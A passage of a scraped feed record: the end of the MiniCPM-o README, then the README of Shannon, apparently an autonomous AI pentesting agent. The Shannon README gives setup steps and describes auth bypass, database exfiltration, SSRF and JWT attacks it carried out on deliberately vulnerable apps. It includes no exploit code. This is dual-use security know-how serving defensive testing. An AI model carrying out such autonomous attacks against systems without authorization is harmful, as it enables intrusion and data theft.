src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/thunlp.png\" width=\"28px\" /> <a href=\"https://nlp.csai.tsinghua.edu.cn/\">THUNLP</a></li> \n <li><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelbest.png\" width=\"28px\" /> <a href=\"https://modelbest.cn/\">ModelBest</a></li> \n</ul> \n<h2>🌟 Star History \n <!-- omit in toc --></h2> \n<p align=\"center\"> <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/star-history-25-09-02.png\" /> </p>\n<table align=\"center\">  \n</table> \n<!-- <picture>\n  <source\n    media=\"(prefers-color-scheme: dark)\"\n    srcset=\"\n      https://api.star-history.com/svg?repos=OpenBMB/MiniCPM-o&type=Date&theme=dark\n    \"\n  />\n  <source\n    media=\"(prefers-color-scheme: light)\"\n    srcset=\"\n      https://api.star-history.com/svg?repos=OpenBMB/MiniCPM-o&type=Date\n    \"\n  />\n  <img\n    alt=\"Star History Chart\"\n    src=\"https://api.star-history.com/svg?repos=OpenBMB/MiniCPM-o&type=Date\"\n  />\n</picture> --> \n<h2>Key Techniques and Other Multimodal Projects \n <!-- omit in toc --></h2> \n<p>👏 Welcome to explore key techniques of MiniCPM-o/V and other multimodal projects of our team:</p> \n<p><a href=\"https://github.com/OpenBMB/VisCPM/tree/main\">VisCPM</a> | <a href=\"https://github.com/OpenBMB/RLPR\">RLPR</a> | <a href=\"https://github.com/RLHF-V/RLHF-V\">RLHF-V</a> | <a href=\"https://github.com/thunlp/LLaVA-UHD\">LLaVA-UHD</a> | <a href=\"https://github.com/RLHF-V/RLAIF-V\">RLAIF-V</a></p> \n<h2>Citation \n <!-- omit in toc --></h2> \n<p>If you find our model/code/paper helpful, please consider citing our papers 📝 and staring us ⭐️！</p> \n<pre><code class=\"language-bib\">@article{yao2024minicpm,\n  title={MiniCPM-V: A GPT-4V Level MLLM on Your Phone},\n  author={Yao, Yuan and Yu, Tianyu and Zhang, Ao and Wang, Chongyi and Cui, Junbo and Zhu, Hongji and Cai, Tianchi and Li, Haoyu and Zhao, Weilin and He, Zhihui and others},\n  journal={arXiv preprint arXiv:2408.01800},\n  year={2024}\n}\n</code></pre>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:02.259103Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 9
          }
        ],
        "structural_score": 25,
        "timeliness_score": 1,
        "final_score": 13.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/KeygraphHQ/shannon",
        "title": "KeygraphHQ/shannon",
        "summary": "<p>Fully autonomous AI hacker to find actual exploits in your web apps. Shannon has achieved a 96.15% success rate on the hint-free, source-aware XBOW Benchmark.</p><hr /><blockquote> \n <p>[!NOTE] <strong><a href=\"https://github.com/KeygraphHQ/shannon/tree/main/xben-benchmark-results/README.md\">Shannon Lite achieves a 96.15% success rate on a hint-free, source-aware XBOW benchmark. →</a></strong></p> \n</blockquote> \n<div align=\"center\"> \n <p><a href=\"https://trendshift.io/repositories/15604\" target=\"_blank\"><img alt=\"KeygraphHQ%2Fshannon | Trendshift\" height=\"55\" src=\"https://trendshift.io/api/badge/repositories/15604\" style=\"width: 250px; height: 55px;\" width=\"250\" /></a></p> \n <img alt=\"Shannon Screen\" src=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/assets/shannon-screen.png?v=2\" width=\"100%\" /> \n <h1>Shannon is your fully autonomous AI pentester.</h1> \n <p>Shannon’s job is simple: break your web app before anyone else does. <br /> The Red Team to your vibe-coding Blue team. <br /> Every Claude (coder) deserves their Shannon.</p> \n <hr /> \n <p><a href=\"https://keygraph.io\">Website</a> • <a href=\"https://discord.gg/KAqzSHHpRt\">Discord</a></p> \n <hr /> \n</div> \n<h2>🎯 What is Shannon?</h2> \n<p>Shannon is an AI pentester that delivers actual exploits, not just alerts.</p> \n<p>Shannon's goal is to break your web app before someone else does. It autonomously hunts for attack vectors in your code, then uses its built-in browser to execute real exploits, such as injection attacks, and auth bypass, to prove the vulnerability is actually exploitable.</p> \n<p><strong>What Problem Does Shannon Solve?</strong></p> \n<p>Thanks to tools like Claude Code and Cursor, your team ships code non-stop. But your penetration test? That happens once a year. This creates a <em>massive</em> security gap. For the other 364 days, you could be unknowingly shipping vulnerabilities to production.</p> \n<p>Shannon closes this gap by acting as your on-demand whitebox pentester. It doesn't just find potential issues. It executes real exploits, providing concrete proof of vulnerabilities. This lets you ship with confidence, knowing every build can be secured.</p> \n<blockquote> \n <p>[!NOTE] <strong>From Autonomous Pentesting to Automated Compliance</strong></p> \n <p>Shannon is a core component of the <strong>Keygraph Security and Compliance Platform</strong>.</p> \n <p>While Shannon automates the critical task of penetration testing for your application, our broader platform automates your entire compliance journey—from evidence collection to audit readiness. We're building the \"Rippling for Cybersecurity,\" a single platform to manage your security posture and streamline compliance frameworks like SOC 2 and HIPAA.</p> \n <p>➡️ <strong><a href=\"https://keygraph.io\">Learn more about the Keygraph Platform</a></strong></p> \n</blockquote> \n<h2>🎬 See Shannon in Action</h2> \n<p><strong>Real Results</strong>: Shannon discovered 20+ critical vulnerabilities in OWASP Juice Shop, including complete auth bypass and database exfiltration. <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-juice-shop.md\">See full report →</a></p> \n<p><img alt=\"Demo\" src=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/assets/shannon-action.gif\" /></p> \n<h2>✨ Features</h2> \n<ul> \n <li><strong>Fully Autonomous Operation</strong>: Launch the pentest with a single command. The AI handles everything from advanced 2FA/TOTP logins (including sign in with Google) and browser navigation to the final report with zero intervention.</li> \n <li><strong>Pentester-Grade Reports with Reproducible Exploits</strong>: Delivers a final report focused on proven, exploitable findings, complete with copy-and-paste Proof-of-Concepts to eliminate false positives and provide actionable results.</li> \n <li><strong>Critical OWASP Vulnerability Coverage</strong>: Currently identifies and validates the following critical vulnerabilities: Injection, XSS, SSRF, and Broken Authentication/Authorization, with more types in development.</li> \n <li><strong>Code-Aware Dynamic Testing</strong>: Analyzes your source code to intelligently guide its attack strategy, then performs live, browser and command line based exploits on the running application to confirm real-world risk.</li> \n <li><strong>Powered by Integrated Security Tools</strong>: Enhances its discovery phase by leveraging leading reconnaissance and testing tools—including <strong>Nmap, Subfinder, WhatWeb, and Schemathesis</strong>—for deep analysis of the target environment.</li> \n <li><strong>Parallel Processing for Faster Results</strong>: Get your report faster. The system parallelizes the most time-intensive phases, running analysis and exploitation for all vulnerability types concurrently.</li> \n</ul> \n<h2>📦 Product Line</h2> \n<p>Shannon is available in two editions:</p> \n<table> \n <thead> \n  <tr> \n   <th>Edition</th> \n   <th>License</th> \n   <th>Best For</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>Shannon Lite</strong></td> \n   <td>AGPL-3.0</td> \n   <td>Security teams, independent researchers, testing your own applications</td> \n  </tr> \n  <tr> \n   <td><strong>Shannon Pro</strong></td> \n   <td>Commercial</td> \n   <td>Enterprises requiring advanced features, CI/CD integration, and dedicated support</td> \n  </tr> \n </tbody> \n</table> \n<blockquote> \n <p><strong>This repository contains Shannon Lite,</strong> which utilizes our core autonomous AI pentesting framework. <strong>Shannon Pro</strong> enhances this foundation with an advanced, LLM-powered data flow analysis engine (inspired by the <a href=\"https://arxiv.org/abs/2402.10754\">LLMDFA paper</a>) for enterprise-grade code analysis and deeper vulnerability detection.</p> \n</blockquote> \n<blockquote> \n <p>[!IMPORTANT] <strong>White-box only.</strong> Shannon Lite is designed for <strong>white-box (source-available)</strong> application security testing.<br /> It expects access to your application's source code and repository layout.</p> \n</blockquote> \n<p><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/SHANNON-PRO.md\">See feature comparison</a></p> \n<h2>📑 Table of Contents</h2> \n<ul> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-what-is-shannon\">What is Shannon?</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-see-shannon-in-action\">See Shannon in Action</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-features\">Features</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-product-line\">Product Line</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-setup--usage-instructions\">Setup &amp; Usage Instructions</a> \n  <ul> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#prerequisites\">Prerequisites</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#quick-start\">Quick Start</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#monitoring-progress\">Monitoring Progress</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#stopping-shannon\">Stopping Shannon</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#usage-examples\">Usage Examples</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#configuration-optional\">Configuration (Optional)</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#experimental---unsupported-router-mode-alternative-providers\">[EXPERIMENTAL - UNSUPPORTED] Router Mode (Alternative Providers)</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#output-and-results\">Output and Results</a></li> \n  </ul> </li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-sample-reports\">Sample Reports</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#%EF%B8%8F-architecture\">Architecture</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-coverage-and-roadmap\">Coverage and Roadmap</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#%EF%B8%8F-disclaimers\">Disclaimers</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-license\">License</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-community--support\">Community &amp; Support</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-get-in-touch\">Get in Touch</a></li> \n</ul> \n<hr /> \n<h2>🚀 Setup &amp; Usage Instructions</h2> \n<h3>Prerequisites</h3> \n<ul> \n <li><strong>Docker</strong> - Container runtime (<a href=\"https://docs.docker.com/get-docker/\">Install Docker</a>)</li> \n <li><strong>AI Provider Credentials</strong> (choose one): \n  <ul> \n   <li><strong>Anthropic API key</strong> (recommended) - Get from <a href=\"https://console.anthropic.com\">Anthropic Console</a></li> \n   <li><strong>Claude Code OAuth token</strong></li> \n   <li><strong>[EXPERIMENTAL - UNSUPPORTED] Alternative providers via Router Mode</strong> - OpenAI or Google Gemini via OpenRouter (see <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#experimental---unsupported-router-mode-alternative-providers\">Router Mode</a>)</li> \n  </ul> </li> \n</ul> \n<h3>Quick Start</h3> \n<pre><code class=\"language-bash\"># 1. Clone Shannon\ngit clone https://github.com/KeygraphHQ/shannon.git\ncd shannon\n\n# 2. Configure credentials (choose one method)\n\n# Option A: Export environment variables\nexport ANTHROPIC_API_KEY=\"your-api-key\"              # or CLAUDE_CODE_OAUTH_TOKEN\nexport CLAUDE_CODE_MAX_OUTPUT_TOKENS=64000           # recommended\n\n# Option B: Create a .env file\ncat &gt; .env &lt;&lt; 'EOF'\nANTHROPIC_API_KEY=your-api-key\nCLAUDE_CODE_MAX_OUTPUT_TOKENS=64000\nEOF\n\n# 3. Run a pentest\n./shannon start URL=https://your-app.com REPO=/path/to/your/repo\n</code></pre> \n<p>Shannon will build the containers, start the workflow, and return a workflow ID. The pentest runs in the background.</p> \n<h3>Monitoring Progress</h3> \n<pre><code class=\"language-bash\"># View real-time worker logs\n./shannon logs\n\n# Query a specific workflow's progress\n./shannon query ID=shannon-1234567890\n\n# Open the Temporal Web UI for detailed monitoring\nopen http://localhost:8233\n</code></pre> \n<h3>Stopping Shannon</h3> \n<pre><code class=\"language-bash\"># Stop all containers (preserves workflow data)\n./shannon stop\n\n# Full cleanup (removes all data)\n./shannon stop CLEAN=true\n</code></pre> \n<h3>Usage Examples</h3> \n<pre><code class=\"language-bash\"># Basic pentest\n./shannon start URL=https://example.com REPO=/path/to/repo\n\n# With a configuration file\n./shannon start URL=https://example.com REPO=/path/to/repo CONFIG=./configs/my-config.yaml\n\n# Custom output directory\n./shannon start URL=https://example.com REPO=/path/to/repo OUTPUT=./my-reports\n</code></pre> \n<h3>Prepare Your Repository</h3> \n<p>Shannon is designed for <strong>web application security testing</strong> and expects all application code to be available in a single directory structure. This works well for:</p> \n<ul> \n <li><strong>Monorepos</strong> - Single repository containing all components</li> \n <li><strong>Consolidated setups</strong> - Multiple repositories organized in a shared folder</li> \n</ul> \n<p><strong>For monorepos:</strong></p> \n<pre><code class=\"language-bash\">git clone https://github.com/your-org/your-monorepo.git /path/to/your-app\n</code></pre> \n<p><strong>For multi-repository applications</strong> (e.g., separate frontend/backend):</p> \n<pre><code class=\"language-bash\">mkdir /path/to/your-app\ncd /path/to/your-app\ngit clone https://github.com/your-org/frontend.git\ngit clone https://github.com/your-org/backend.git\ngit clone https://github.com/your-org/api.git\n</code></pre> \n<h3>Platform-Specific Instructions</h3> \n<p><strong>For Linux (Native Docker):</strong></p> \n<p>You may need to run commands with <code>sudo</code> depending on your Docker setup. If you encounter permission issues with output files, ensure your user has access to the Docker socket.</p> \n<p><strong>For macOS:</strong></p> \n<p>Works out of the box with Docker Desktop installed.</p> \n<p><strong>Testing Local Applications:</strong></p> \n<p>Docker containers cannot reach <code>localhost</code> on your host machine. Use <code>host.docker.internal</code> in place of <code>localhost</code>:</p> \n<pre><code class=\"language-bash\">./shannon start URL=http://host.docker.internal:3000 REPO=/path/to/repo\n</code></pre> \n<h3>Configuration (Optional)</h3> \n<p>While you can run without a config file, creating one enables authenticated testing and customized analysis.</p> \n<h4>Create Configuration File</h4> \n<p>Copy and modify the example configuration:</p> \n<pre><code class=\"language-bash\">cp configs/example-config.yaml configs/my-app-config.yaml\n</code></pre> \n<h4>Basic Configuration Structure</h4> \n<pre><code class=\"language-yaml\">authentication:\n  login_type: form\n  login_url: \"https://your-app.com/login\"\n  credentials:\n    username: \"test@example.com\"\n    password: \"yourpassword\"\n    totp_secret: \"LB2E2RX7XFHSTGCK\"  # Optional for 2FA\n\n  login_flow:\n    - \"Type $username into the email field\"\n    - \"Type $password into the password field\"\n    - \"Click the 'Sign In' button\"\n\n  success_condition:\n    type: url_contains\n    value: \"/dashboard\"\n\nrules:\n  avoid:\n    - description: \"AI should avoid testing logout functionality\"\n      type: path\n      url_path: \"/logout\"\n\n  focus:\n    - description: \"AI should emphasize testing API endpoints\"\n      type: path\n      url_path: \"/api\"\n</code></pre> \n<h4>TOTP Setup for 2FA</h4> \n<p>If your application uses two-factor authentication, simply add the TOTP secret to your config file. The AI will automatically generate the required codes during testing.</p> \n<h3>[EXPERIMENTAL - UNSUPPORTED] Router Mode (Alternative Providers)</h3> \n<p>Shannon can experimentally route requests through alternative AI providers using claude-code-router. This mode is not officially supported and is intended primarily for:</p> \n<ul> \n <li><strong>Model experimentation</strong> — try Shannon with GPT-5.2 or Gemini 3–family models</li> \n</ul> \n<h4>Quick Setup</h4> \n<ol> \n <li>Add your provider API key to <code>.env</code>:</li> \n</ol> \n<pre><code class=\"language-bash\"># Choose one provider:\nOPENAI_API_KEY=sk-...\n# OR\nOPENROUTER_API_KEY=sk-or-...\n\n# Set default model:\nROUTER_DEFAULT=openai,gpt-5.2  # provider,model format\n</code></pre> \n<ol start=\"2\"> \n <li>Run with <code>ROUTER=true</code>:</li> \n</ol> \n<pre><code class=\"language-bash\">./shannon start URL=https://example.com REPO=/path/to/repo ROUTER=true\n</code></pre> \n<h4>Experimental Models</h4> \n<table> \n <thead> \n  <tr> \n   <th>Provider</th> \n   <th>Models</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td>OpenAI</td> \n   <td>gpt-5.2, gpt-5-mini</td> \n  </tr> \n  <tr> \n   <td>OpenRouter</td> \n   <td>google/gemini-3-flash-preview</td> \n  </tr> \n </tbody> \n</table> \n<h4>Disclaimer</h4> \n<p>This feature is experimental and unsupported. Output quality depends heavily on the model. Shannon is built on top of the Anthropic Agent SDK and is optimized and primarily tested with Anthropic Claude models. Alternative providers may produce inconsistent results (including failing early phases like Recon) depending on the model and routing setup.</p> \n<h3>Output and Results</h3> \n<p>All results are saved to <code>./audit-logs/{hostname}_{sessionId}/</code> by default. Use <code>--output &lt;path&gt;</code> to specify a custom directory.</p> \n<p>Output structure:</p> \n<pre><code>audit-logs/{hostname}_{sessionId}/\n├── session.json          # Metrics and session data\n├── agents/               # Per-agent execution logs\n├── prompts/              # Prompt snapshots for reproducibility\n└── deliverables/\n    └── comprehensive_security_assessment_report.md   # Final comprehensive security report\n</code></pre> \n<hr /> \n<h2>📊 Sample Reports</h2> \n<blockquote> \n <p><strong>Looking for quantitative benchmarks?</strong> <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/xben-benchmark-results/README.md\">See full benchmark methodology and results →</a></p> \n</blockquote> \n<p>See Shannon's capabilities in action with penetration test results from industry-standard vulnerable applications:</p> \n<h4>🧃 <strong>OWASP Juice Shop</strong> • <a href=\"https://github.com/juice-shop/juice-shop\">GitHub</a></h4> \n<p><em>A notoriously insecure web application maintained by OWASP, designed to test a tool's ability to uncover a wide range of modern vulnerabilities.</em></p> \n<p><strong>Performance</strong>: Identified <strong>over 20 high-impact vulnerabilities</strong> across targeted OWASP categories in a single automated run.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Achieved complete authentication bypass</strong> and exfiltrated the entire user database via Injection attack</li> \n <li><strong>Executed a full privilege escalation</strong> by creating a new administrator account through a registration workflow bypass</li> \n <li><strong>Identified and exploited systemic authorization flaws (IDOR)</strong> to access and modify any user's private data and shopping cart</li> \n <li><strong>Discovered a Server-Side Request Forgery (SSRF)</strong> vulnerability, enabling internal network reconnaissance</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-juice-shop.md\">View Complete Report →</a></strong></p> \n<hr /> \n<h4>🔗 <strong>c{api}tal API</strong> • <a href=\"https://github.com/Checkmarx/capital\">GitHub</a></h4> \n<p><em>An intentionally vulnerable API from Checkmarx, designed to test a tool's ability to uncover the OWASP API Security Top 10.</em></p> \n<p><strong>Performance</strong>: Identified <strong>nearly 15 critical and high-severity vulnerabilities</strong>, leading to full application compromise.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Executed a root-level Injection attack</strong> by bypassing a denylist via command chaining in a hidden debug endpoint</li> \n <li><strong>Achieved complete authentication bypass</strong> by discovering and targeting a legacy, unpatched v1 API endpoint</li> \n <li><strong>Escalated a regular user to full administrator privileges</strong> by exploiting a Mass Assignment vulnerability in the user profile update function</li> \n <li><strong>Demonstrated high accuracy</strong> by correctly confirming the application's robust XSS defenses, reporting zero false positives</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-capital-api.md\">View Complete Report →</a></strong></p> \n<hr /> \n<h4>🚗 <strong>OWASP crAPI</strong> • <a href=\"https://github.com/OWASP/crAPI\">GitHub</a></h4> \n<p><em>A modern, intentionally vulnerable API from OWASP, designed to benchmark a tool's effectiveness against the OWASP API Security Top 10.</em></p> \n<p><strong>Performance</strong>: Identified <strong>over 15 critical and high-severity vulnerabilities</strong>, achieving full application compromise.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Bypassed authentication using multiple advanced JWT attacks</strong>, including Algorithm Confusion, alg:none, and weak key (kid) injection</li> \n <li><strong>Achieved full database compromise via Injection attacks</strong>, exfiltrating user credentials from the PostgreSQL database</li> \n <li><strong>Executed a critical Server-Side Request Forgery (SSRF) attack</strong> that successfully forwarded internal authentication tokens to an external service</li> \n <li><strong>Demonstrated high accuracy</strong> by correctly identifying the application's robust XSS defenses, reporting zero false positives</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-crapi.md\">View Complete Report →</a></strong></p> \n<hr /> \n<p><em>These results demonstrate Shannon's ability to move beyond simple scanning, performing deep contextual exploitation with minimal false positives and actionable proof-of-concepts.</em></p> \n<hr /> \n<h2>🏗️ Architecture</h2> \n<p>Shannon emulates a human penetration tester's methodology using a sophisticated multi-agent architecture. It combines white-box source code analysis with black-box dynamic exploitation across four distinct phases:</p> \n<pre><code>                    ┌──────────────────────┐\n                    │    Reconnaissance    │\n                    └──────────┬───────────┘\n                               │\n                               ▼\n                    ┌──────────┴───────────┐\n                    │          │           │\n                    ▼          ▼           ▼\n        ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐\n        │ Vuln Analysis   │ │ Vuln Analysis   │ │      ...        │\n        │  (Injection)    │ │     (XSS)       │ │                 │\n        └─────────┬───────┘ └─────────┬───────┘ └─────────┬───────┘\n                  │                   │                   │\n                  ▼                   ▼                   ▼\n        ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐\n        │  Exploitation   │ │  Exploitation   │ │      ...        │\n        │  (Injection)    │ │     (XSS)       │ │                 │\n        └─────────┬───────┘ └─────────┬───────┘ └─────────┬───────┘\n                  │                   │                   │\n                  └─────────┬─────────┴───────────────────┘\n                            │\n                            ▼\n                    ┌──────────────────────┐\n                    │      Reporting       │\n                    └──────────────────────┘\n</code></pre> \n<h3>Architectural Overview</h3> \n<p>Shannon is engineered to emulate the methodology of a human penetration tester. It leverages Anthropic's Claude Agent SDK as its core reasoning engine, but its true strength lies in the sophisticated multi-agent architecture built around it. This architecture combines the deep context of <strong>white-box source code analysis</strong> with the real-world validation of <strong>black-box dynamic exploitation</strong>, managed by an orchestrator through four distinct phases to ensure a focus on minimal false positives and intelligent context management.</p> \n<hr /> \n<h4><strong>Phase 1: Reconnaissance</strong></h4> \n<p>The first phase builds a comprehensive map of the application's attack surface. Shannon analyzes the source code and integrates with tools like Nmap and Subfinder to understand the tech stack and infrastructure. Simultaneously, it performs live application exploration via browser automation to correlate code-level insights with real-world behavior, producing a detailed map of all entry points, API endpoints, and authentication mechanisms for the next phase.</p> \n<h4><strong>Phase 2: Vulnerability Analysis</strong></h4> \n<p>To maximize efficiency, this phase operates in parallel. Using the reconnaissance data, specialized agents for each OWASP category hunt for potential flaws in parallel. For vulnerabilities like Injection and SSRF, agents perform a structured data flow analysis, tracing user input to dangerous sinks. This phase produces a key deliverable: a list of <strong>hypothesized exploitable paths</strong> that are passed on for validation.</p> \n<h4><strong>Phase 3: Exploitation</strong></h4> \n<p>Continuing the parallel workflow to maintain speed, this phase is dedicated entirely to turning hypotheses into proof. Dedicated exploit agents receive the hypothesized paths and attempt to execute real-world attacks using browser automation, command-line tools, and custom scripts. This phase enforces a strict <strong>\"No Exploit, No Report\"</strong> policy: if a hypothesis cannot be successfully exploited to demonstrate impact, it is discarded as a false positive.</p> \n<h4><strong>Phase 4: Reporting</strong></h4> \n<p>The final phase compiles all validated findings into a professional, actionable report. An agent consolidates the reconnaissance data and the successful exploit evidence, cleaning up any noise or hallucinated artifacts. Only verified vulnerabilities are included, complete with <strong>reproducible, copy-and-paste Proof-of-Concepts</strong>, delivering a final pentest-grade report focused exclusively on proven risks.</p> \n<h2>📋 Coverage and Roadmap</h2> \n<p>For detailed information about Shannon's security testing coverage and development roadmap, see our <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/COVERAGE.md\">Coverage and Roadmap</a> documentation.</p> \n<h2>⚠️ Disclaimers</h2> \n<h3>Important Usage Guidelines &amp; Disclaimers</h3> \n<p>Please review the following guidelines carefully before using Shannon (Lite). As a user, you are responsible for your actions and assume all liability.</p> \n<h4><strong>1. Potential for Mutative Effects &amp; Environment Selection</strong></h4> \n<p>This is not a passive scanner. The exploitation agents are designed to <strong>actively execute attacks</strong> to confirm vulnerabilities. This process can have mutative effects on the target application and its data.</p> \n<blockquote> \n <p>[!WARNING] <strong>⚠️ DO NOT run Shannon on production environments.</strong></p> \n <ul> \n  <li>It is intended exclusively for use on sandboxed, staging, or local development environments where data integrity is not a concern.</li> \n  <li>Potential mutative effects include, but are not limited to: creating new users, modifying or deleting data, compromising test accounts, and triggering unintended side effects from injection attacks.</li> \n </ul> \n</blockquote> \n<h4><strong>2. Legal &amp; Ethical Use</strong></h4> \n<p>Shannon is designed for legitimate security auditing purposes only.</p> \n<blockquote> \n <p>[!CAUTION] <strong>You must have explicit, written authorization</strong> from the owner of the target system before running Shannon.</p> \n <p>Unauthorized scanning and exploitation of systems you do not own is illegal and can be prosecuted under laws such as the Computer Fraud and Abuse Act (CFAA). Keygraph is not responsible for any misuse of Shannon.</p> \n</blockquote> \n<h4><strong>3. LLM &amp; Automation Caveats</strong></h4> \n<ul> \n <li><strong>Verification is Required</strong>: While significant engineering has gone into our \"proof-by-exploitation\" methodology to eliminate false positives, the underlying LLMs can still generate hallucinated or weakly-supported content in the final report. <strong>Human oversight is essential</strong> to validate the legitimacy and severity of all reported findings.</li> \n <li><strong>Comprehensiveness</strong>: The analysis in Shannon Lite may not be exhaustive due to the inherent limitations of LLM context windows. For a more comprehensive, graph-based analysis of your entire codebase, <strong>Shannon Pro</strong> leverages its advanced data flow analysis engine to ensure deeper and more thorough coverage.</li> \n</ul> \n<h4><strong>4. Scope of Analysis</strong></h4> \n<ul> \n <li><strong>Targeted Vulnerabilities</strong>: The current version of Shannon Lite specifically targets the following classes of <em>exploitable</em> vulnerabilities: \n  <ul> \n   <li>Broken Authentication &amp; Authorization</li> \n   <li>Injection</li> \n   <li>Cross-Site Scripting (XSS)</li> \n   <li>Server-Side Request Forgery (SSRF)</li> \n  </ul> </li> \n <li><strong>What Shannon Lite Does Not Cover</strong>: This list is not exhaustive of all potential security risks. Shannon Lite's \"proof-by-exploitation\" model means it will not report on issues it cannot actively exploit, such as vulnerable third-party libraries or insecure configurations. These types of deep static-analysis findings are a core focus of the advanced analysis engine in <strong>Shannon Pro</strong>.</li> \n</ul> \n<h4><strong>5. Cost &amp; Performance</strong></h4> \n<ul> \n <li><strong>Time</strong>: As of the current version, a full test run typically takes <strong>1 to 1.5 hours</strong> to complete.</li> \n <li><strong>Cost</strong>: Running the full test using Anthropic's Claude 4.5 Sonnet model may incur costs of approximately <strong>$50 USD</strong>. Costs vary based on model pricing and application complexity.</li> \n</ul> \n<h4><strong>6. Windows Antivirus False Positives</strong></h4> \n<p>Windows Defender may flag files in <code>xben-benchmark-results/</code> or <code>deliverables/</code> as malware. These are false positives caused by exploit code in the reports. Add an exclusion for the Shannon directory in Windows Defender, or use Docker/WSL2.</p> \n<h2>📜 License</h2> \n<p>Shannon Lite is released under the <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/LICENSE\">GNU Affero General Public License v3.0 (AGPL-3.0)</a>.</p> \n<p>Shannon is open source (AGPL v3). This license allows you to:</p> \n<ul> \n <li>Use it freely for all internal security testing.</li> \n <li>Modify the code privately for internal use without sharing your changes.</li> \n</ul> \n<p>The AGPL's sharing requirements primarily apply to organizations offering Shannon as a public or managed service (such as a SaaS platform). In those specific cases, any modifications made to the core software must be open-sourced.</p> \n<h2>👥 Community &amp; Support</h2> \n<h3>Community Resources</h3> \n<p><strong>Contributing:</strong> At this time, we’re not accepting external code contributions (PRs).<br /> Issues are welcome for bug reports and feature requests.</p> \n<ul> \n <li>🐛 <strong>Report bugs</strong> via <a href=\"https://github.com/KeygraphHQ/shannon/issues\">GitHub Issues</a></li> \n <li>💡 <strong>Suggest features</strong> in <a href=\"https://github.com/KeygraphHQ/shannon/discussions\">Discussions</a></li> \n <li>💬 <strong>Join our <a href=\"https://discord.gg/KAqzSHHpRt\">Discord</a></strong> for real-time community support</li> \n</ul> \n<h3>Stay Connected</h3> \n<ul> \n <li>🐦 <strong>Twitter</strong>: <a href=\"https://twitter.com/KeygraphHQ\">@KeygraphHQ</a></li> \n <li>💼 <strong>LinkedIn</strong>: <a href=\"https://linkedin.com/company/keygraph\">Keygraph</a></li> \n <li>🌐 <strong>Website</strong>: <a href=\"https://keygraph.io\">keygraph.io</a></li> \n</ul> \n<h2>💬 Get in Touch</h2> \n<h3>Interested in Shannon Pro?</h3> \n<p>Shannon Pro is designed for organizations serious about application security. It offers enterprise-grade features, dedicated support, and seamless CI/CD integration, all powered by our most advanced LLM-based analysis engine. Find and fix complex vulnerabilities deep in your codebase before they ever reach production.</p> \n<p>For a detailed breakdown of features, technical differences, and enterprise use cases, see our <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/SHANNON-PRO.md\">complete comparison guide</a>.</p> \n<p align=\"center\"> <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSf-cPZcWjlfBJ3TCT8AaWpf8ztsw3FaHzJE4urr55KdlQs6cQ/viewform?usp=header\" target=\"_blank\"> <img alt=\"Express Interest\" src=\"https://img.shields.io/badge/📋%20Express%20Interest%20in%20Shannon%20Pro-4285F4?style=for-the-badge&amp;logo=google&amp;logoColor=white\" /> </a> </p> \n<p><strong>Or contact us directly:</strong></p> \n<p>📧 <strong>Email</strong>: <a 